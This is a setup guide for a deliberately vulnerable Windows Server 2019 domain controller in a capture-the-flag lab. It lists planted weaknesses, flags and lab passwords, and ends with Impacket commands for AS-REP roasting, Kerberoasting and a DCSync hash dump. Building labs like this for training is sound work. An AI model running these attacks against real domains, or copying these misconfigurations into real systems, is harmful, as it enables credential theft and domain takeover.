# 🏢 Machine 7 — int-dc01 (Windows Server 2019 Domain Controller)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY**

---

## 📥 Download & Install Windows Server 2019

> **You need a real Windows Server 2019 VM. This machine cannot run in Docker.**

| Resource | URL |
|----------|-----|
| **Windows Server 2019 Evaluation ISO** (180-day free) | https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019 |
| **VirtualBox** (recommended hypervisor) | https://www.virtualbox.org/wiki/Downloads |
| **VMware Workstation Player** (alternative) | https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html |

### VirtualBox VM Settings
```
Name:       VULNCORP-INT-DC01
Type:       Microsoft Windows
Version:    Windows 2019 (64-bit)
RAM:        4096 MB
vCPUs:      2
Disk:       60 GB (VDI, dynamically allocated)
Network:    Adapter 1 → Host-Only → vboxnet2 (192.168.1.0/24)
```

### During Windows Setup
1. Select **"Windows Server 2019 Standard (Desktop Experience)"**
2. Set Administrator password: `Corp@Admin2024`
3. After install, open **Control Panel → Network → Ethernet** and set static IP:
   - IP Address:  `192.168.1.10`
   - Subnet Mask: `255.255.255.0`
   - Default Gateway: `192.168.1.1`
   - DNS Server:  `127.0.0.1` ← (self, will serve DNS after AD install)

---

## 🚀 One-Command Deployment (PowerShell)

On your fresh **Windows Server 2019 VM** (`192.168.1.10`):

1. Copy `deploy_dc.ps1` to the server (USB, shared folder, or SCP).
2. Open **PowerShell as Administrator**.
3. Run:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\deploy_dc.ps1
```
4. The server will install AD DS and promote itself to `vulncorp.local`, then **reboot automatically**.
5. After reboot, log back in as **Administrator** and run `.\deploy_dc.ps1` once more to finish configuring all intentional vulnerabilities and flags.

> ⚠️ **Deploy int-dc01 BEFORE int-ws01.** The workstation script joins this domain, so the domain must exist first.

---

## 🔗 Connection to int-ws01 (Windows 10 Workstation)

This DC is the authentication authority for `int-ws01` (`192.168.1.60`).

| Protocol | Port | Purpose |
|----------|------|---------|
| Kerberos | 88 (TCP/UDP) | Ticket-Granting for workstation auth |
| LDAP | 389 (TCP) | AD queries from workstation |
| SMB | 445 (TCP) | Domain auth, SYSVOL, NETLOGON |
| DNS | 53 (TCP/UDP) | Domain name resolution |
| RDP | 3389 (TCP) | Admin access |

The workstation (`deploy_ws.ps1`) will:
1. Point its DNS to `192.168.1.10` (this DC)
2. Join domain `vulncorp.local` using `VULNCORP\Administrator / Corp@Admin2024`
3. Place `john.doe`'s credentials (who is a Domain Admin) in accessible files

---

## 🎯 Configured Vulnerabilities
1. **AS-REP Roasting:** `svc_backup` has Kerberos pre-authentication disabled (`DoesNotRequirePreAuth = $true`). → Flag: `VULN{4sr3p_r04st_cr4ck3d}`
2. **Kerberoasting:** `svc_erp` and `svc_sql` have Service Principal Names (SPNs) registered. → Flag: `VULN{k3rb3r04st_svc_pwn3d}`
3. **DCSync Rights:** `svc_backup` has `GenericAll` rights on the domain root. → Flag: `VULN{dcs1nc_h4sh_dump3d}`
4. **GPP cPassword:** `SYSVOL\vulncorp.local\Policies\...\Groups.xml` contains encrypted cPassword (`backdoor`). → Flag: `VULN{gpp_p4ssw0rd_l34k}`
5. **SMB Signing Disabled:** NTLM relay attacks permitted.
6. **RDP Without NLA:** Port 3389 accessible without Network Level Authentication.
7. **Flag Planted:** `C:\flags\domain_flag.txt` → `VULN{d0m41n_4dm1n_3mp1r3_f3ll}` (Ultimate CTF Win)

---

## 🔍 Verification Commands (from Kali)

```bash
# Enumerate domain
nmap -p 88,389,445,3389 192.168.1.10

# AS-REP Roasting
python3 GetNPUsers.py vulncorp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10

# Kerberoasting
python3 GetUserSPNs.py vulncorp.local/john.doe:Corp@Admin2024 -dc-ip 192.168.1.10 -request

# DCSync
python3 secretsdump.py vulncorp.local/svc_backup:Backup@Svc2024@192.168.1.10
```
